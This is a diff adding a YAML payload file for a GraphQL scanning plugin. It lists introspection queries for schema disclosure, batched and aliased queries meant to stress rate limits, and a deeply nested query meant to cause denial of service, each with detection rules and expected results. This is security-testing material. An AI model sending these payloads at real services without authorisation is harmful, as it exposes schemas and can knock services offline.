@@ -1,0 +1,99 @@
+# GraphQL Payloads Database
+# Plugin: core.api.graphql
+
+plugin_id: core.api.graphql
+mutation_type: field_injection
+payload_type: graphql
+
+variants:
+  # Variant 1: Introspection query
+  - id: introspection_query
+    payloads:
+      - |
+        query IntrospectionQuery {
+          __schema {
+            types {
+              name
+              fields {
+                name
+              }
+            }
+          }
+        }
+      - |
+        {__schema{types{name,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}}
+    tech_stack: [graphql]
+    confidence_boost: 0.25
+    detection: body_matches_any(__schema, __type, Query, Mutation)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+        - [json_unicode]
+      obfuscation: []
+      max_combinations: 4
+
+  # Variant 2: Batch query (DoS)
+  - id: batch_query
+    payloads:
+      - |
+        [
+          {"query": "{ __typename }"},
+          {"query": "{ __typename }"},
+          {"query": "{ __typename }"}
+        ]
+      - |
+        query { a:__typename b:__typename c:__typename d:__typename e:__typename }
+    tech_stack: [graphql]
+    confidence_boost: 0.18
+    detection: timing_delta > 3000 OR body_matches_any(error, too many)
+    auto_variants:
+      encoding_chains:
+        - [json_unicode]
+      obfuscation: []
+      max_combinations: 4
+
+  # Variant 3: Depth attack
+  - id: depth_attack
+    payloads:
+      - |
+        query {
+          user {
+            posts {
+              comments {
+                author {
+                  posts {
+                    comments {
+                      author {
+                        id
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+    tech_stack: [graphql]
+    confidence_boost: 0.20
+    detection: timing_delta > 5000 OR status_code == 500
+    auto_variants:
+      encoding_chains: []
+      obfuscation: []
+      max_combinations: 2
+
+keywords:
+  - query
+  - mutation
+  - graphql
+  - gql
+
+expected_results:
+  introspection_query:
+    indicator: schema_disclosed
+    expected_output: "__schema"
+  batch_query:
+    indicator: rate_limit_bypass
+    expected_output: "__typename"
+  depth_attack:
+    indicator: dos
+    expected_output: ""
